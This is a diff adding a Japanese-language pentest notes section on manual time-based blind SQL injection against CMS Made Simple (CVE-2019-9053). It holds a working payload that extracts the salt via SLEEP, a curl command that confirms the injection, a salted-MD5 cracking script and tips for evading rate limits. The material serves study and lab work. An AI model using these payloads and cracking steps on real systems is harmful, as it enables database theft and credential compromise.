@@ -86,6 +86,78 @@ sqlmap -u "http://[TARGET]/page" \
 
 ---
 
+## タイムベースブラインドSQLi（手動アプローチ）
+
+### 着火条件
+- エラーメッセージも差分レスポンスも出ない（完全にブラインド）が、**レスポンス時間の遅延**だけが観測できる場合
+- DoS保護・WAFにより sqlmap が機能しない場合（リクエストレート制限あり）
+- CVE のエクスプロイトが時間計測ベースで動作している場合
+
+### 観点・着眼点
+
+エラーも差分レスポンスもない状態では「**DBがスリープしているかどうか**」だけが唯一のオラクル。1文字ずつ LIKE + SLEEP でデータを抽出するため、全データ取得に時間がかかる。焦らず自動化スクリプトに任せる。
+
+**抽出の優先順位：**
+1. ソルト（`cms_siteprefs` テーブルの `sitemask` 等）
+2. ユーザー名
+3. メールアドレス
+4. パスワードハッシュ
+
+ハッシュよりソルトを先に取得する理由：多くのWebアプリは `md5(salt + password)` でハッシュを生成するため、ソルトなしではクラックできない。
+
+### 手順（CMS Made Simple ≤ 2.2.9 / CVE-2019-9053 パターン）
+
+```bash
+# searchsploit でエクスプロイトを確認・取得
+searchsploit cms made simple
+searchsploit -m php/webapps/46635.py
+
+# Python3 環境では2系スクリプトを移植する必要がある場合がある
+# 主な変更点:
+#   print 文 → print() 関数
+#   hashlib.md5(str(salt) + word) → hashlib.md5((salt + word).encode()).hexdigest()
+#   リクエスト間に time.sleep(0.5) を追加（DoS保護回避）
+```
+
+**ペイロード構造（タイムベース文字抽出）：**
+```
+# ソルト抽出ペイロード例
+a,b,1,5))+and+(select+sleep(3)+from+cms_siteprefs+where+sitepref_value+like+0x[HEX_PREFIX]25+and+sitepref_name+like+0x736974656d61736b)+--+
+```
+
+**手動でのタイムベースSQLi確認：**
+```bash
+# 脆弱性の存在確認（3秒遅延するか）
+curl -s "http://[TARGET]/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(3))+--+" -o /dev/null -w "%{time_total}\n"
+# 3秒以上かかれば SQLi が成立している
+```
+
+**Python でのパスワードクラック（ソルト付きMD5）：**
+```python
+import hashlib
+
+salt   = "[取得したソルト]"
+hash_  = "[取得したMD5ハッシュ]"
+
+with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
+    for line in f:
+        word = line.strip()
+        if hashlib.md5((salt + word).encode()).hexdigest() == hash_:
+            print(f"[+] パスワード: {word}")
+            break
+```
+
+### 注意点・落とし穴
+
+- **DoS保護があるサイトではリクエスト間に遅延を入れる**（`time.sleep(0.5)` 程度）。連続リクエストで接続が切られると抽出が止まる
+- スリープ閾値（TIME変数）は環境のレイテンシに合わせて調整する。レイテンシが200ms以上ある場合は `TIME=5` 程度に上げる
+- 文字セット（dictionary）に不足がある場合は1文字も抽出されずに終わる。エラーなく空文字が返る場合は文字セットを確認
+- Python 2系のエクスプロイトは `hashlib.md5(str(salt) + word)` でバイト/文字列の混在エラーが出る。Python 3では `.encode()` が必要
+- 一部のCMSはセッション管理があり、Cookieなしではクエリが実行されないことがある
+
+---
+
 ## 関連技術
 - 認証情報が取得できた → `../Credential_Discovery.md`
+- MD5+Salt ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`（mode 20）
 - 管理者パネルにアクセスできた → Webアプリ固有の機能を調査
